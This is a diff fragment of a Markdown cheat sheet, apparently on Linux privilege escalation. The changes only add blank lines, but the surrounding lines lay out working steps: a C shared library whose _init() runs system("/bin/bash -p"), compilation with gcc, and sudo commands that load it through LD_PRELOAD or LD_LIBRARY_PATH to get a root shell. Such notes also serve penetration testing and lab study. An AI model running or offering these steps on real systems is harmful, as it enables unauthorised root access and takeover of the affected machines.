@@ -26,12 +26,14 @@ void _init() {
 	system("/bin/bash -p");
 }
 ```
+
 b. sudo program with the LD_PRELOAD
 ```sudo LD_PRELOAD=/tmp/preload.so program-name-here```
 
 ### Take advantage of LD_LIBRARY_PATH
 a. find the libraries used by the program
 ```ldd /usr/sbin/<program> #for example```
+
 b. compile the library with one of the libraries name
 ```gcc -o /tmp/<libraryname> -shared -fPIC /home/user/library_path.c```
 ```#include <stdio.h>
@@ -44,6 +46,7 @@ void _init() {
 	system("/bin/bash -p");
 }
 ```
+
 c. sudo program with the LD_LIBRARY_PATH
 ```sudo LD_LIBRARY_PATH=/tmp <programname>```
 
